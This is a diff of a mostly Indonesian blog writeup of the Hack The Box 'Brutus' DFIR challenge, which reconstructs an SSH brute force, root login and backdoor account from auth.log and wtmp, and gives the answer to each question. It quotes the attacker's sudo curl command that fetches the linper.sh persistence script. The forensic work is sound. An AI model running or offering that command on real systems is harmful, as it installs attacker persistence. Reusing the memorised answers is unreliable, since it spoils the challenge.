@@ -1,8 +1,19 @@
+---
+title: "Writeup: HTB Brutus"
+pubDate: 2025-03-24
+description: "Writeup HTB DFIR challenge Brutus"
+author: "natanhp"
+excerpt: "In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution."
+image:
+  src: "../assets/images/htb-brutus-achievment.png"
+  alt: "Achievement HTB Brutus"
+tags: ["Cyber Security", "DFIR"]
+---
 ```
 In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
 ```
 
-Skenario dari chellenge ini adalah ada seorang attacker yang menyerang sebuah server dengan metode brute force. Di sini kita diminta menganalisa log agar dapat mendokumentasikan bagaiama attacker dapat masuk ke dalam sistem dan apa yang dilakukan attacker setelah masuk ke dalam sistem hanya melalui log dan utmp file.
+Skenario dari chellenge ini adalah ada seorang attacker yang menyerang sebuah server dengan metode brute force. Di sini kita diminta menganalisa log agar dapat mendokumentasikan bagaiama attacker dapat masuk ke dalam sistem dan apa yang dilakukan attacker setelah masuk ke dalam sistem hanya melalui log ssh dan utmp file.
 
 ### 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
 `auth.log` ini adalah log file dari ssh server. Jadi event yang berkaitan dengan ssh akan disimpan di sini seperti percobaan koneksi dan autentikasi yang gagal atau berhasil.
@@ -26,6 +37,8 @@ Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication 
 
 Dari log yang ada, bisa di lihat ada beberapa kali percobaan login yang terekam dari IP `65.2.161.68`. Jadi bisa disimpulkan kalau IP `65.2.161.68` adalah IP dari attacker.
 
+#### `65.2.161.68`
+
 ### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
 ```
 Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
@@ -34,6 +47,8 @@ Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root
 ```
 
 Saat ini, attacker sudah dapat menebak password yang benar untuk sebuah username bernama `root`.
+
+#### `root`
 
 ### 3.  Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
 
@@ -62,7 +77,7 @@ Di sini saya belum bisa mendapat jawaban yang tepat. Jawaban yang sudah saya cob
 #### Update
 Setelah melihat writeup yang disediakan, ternyata file `wtmp` yang dibuka dengan `last` hanyalah berupa ringkasan, sedangkan untuk detailnya bisa menggunakan `utmpdump`.
 
-```
+```sh
 natanhp@ngoumah ~/D/p/p/d/h/b/Brutus [1]> utmpdump wtmp
 Utmp dump of wtmp
 [2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
@@ -104,9 +119,13 @@ Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root
 
 Dari file log timestamp yang tercatat kalau attacker login pada `06-03 06:32:44`, sedangkan mungkin yang dimaksud login dari soal ini adalah ketika attacker diberi akses terminal setelah autentikasi. Informasi tadi bisa didapat setelah menjalankan perintah `utmpdump wtmp`, yaitu `2024-03-06 06:32:45`.
 
+#### `2024-03-06 06:32:45`
+
 ### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
 
 Dari pembahasan di [pertanyaan nomor 2](#2-the-bruteforce-attempts-were-successful-and-attacker-gained-access-to-an-account-on-the-server-what-is-the-username-of-the-account), tertulis session `34` digenerate untuk user `root`.
+
+#### `34`
 
 ### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
 
@@ -130,6 +149,8 @@ Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1
 
 Attacker kembali login menggunakan user `root` dan membuat user bernama `cyberjunkie`.
 
+#### `cyberjunkie`
+
 ### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
 
 MITRE ATT&CK adalah framework yang mendokumentasikan tentang taktik serangan keamanan siber.
@@ -147,6 +168,8 @@ Adversaries may create a local account to maintain access to victim systems. Loc
 
 Sub dari [T1136](#t1136) yang menjelaskan kalau yang dibuat oleh attacker adalah local account, jadi hanya akun yang bisa digunakan di satu sistem.
 
+#### `T1136.001`
+
 ### 7. What time did the attacker's first SSH session end according to auth.log?
 
 Ini sama seperti [soal nomor 3](#3-identify-the-timestamp-when-the-attacker-logged-in-manually-to-the-server-to-carry-out-their-objectives-the-login-time-will-be-different-than-the-authentication-time-and-can-be-found-in-the-wtmp-artifact) di mana jawaban yang saya coba salah semua, seperti:
@@ -155,6 +178,8 @@ Ini sama seperti [soal nomor 3](#3-identify-the-timestamp-when-the-attacker-logg
 
 #### Update
 Setelah mengerjakan [soal nomor 3](#3-identify-the-timestamp-when-the-attacker-logged-in-manually-to-the-server-to-carry-out-their-objectives-the-login-time-will-be-different-than-the-authentication-time-and-can-be-found-in-the-wtmp-artifact) dan melihat dari `utmpdump`, ternyata hanya salah tahun, sehingga yang benar adalah `2024-03-06 06:37:24`.
+
+#### `2024-03-06 06:37:24`
 
 ### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 
@@ -167,6 +192,7 @@ Di sini attacker mengunduh script yang digunakan untuk menyiapkan koneksi revers
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
+#### `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
 ## Achievement Link
 https://labs.hackthebox.com/achievement/sherlock/129806/631
